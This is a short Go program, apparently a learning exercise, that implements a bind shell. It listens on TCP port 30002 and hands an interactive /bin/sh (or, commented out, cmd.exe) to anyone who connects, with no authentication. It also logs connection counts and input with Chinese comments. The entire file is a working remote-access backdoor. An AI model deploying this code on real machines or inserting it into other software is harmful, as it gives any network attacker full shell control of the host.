package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	//設定標準輸入設置為我們的連線
	cmd.Stdin = conn
	fmt.Println("收到的指令:", cmd.Stdin)
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	err := cmd.Run()
	if err != nil {
		fmt.Println(err.Error())
	}
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":30002")
	if err != nil {
		log.Fatalln(err)
	}
	var i int
	i = 0

	for {
		conn, err := listener.Accept()
		i++
		fmt.Println("第", i, "個連線")
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
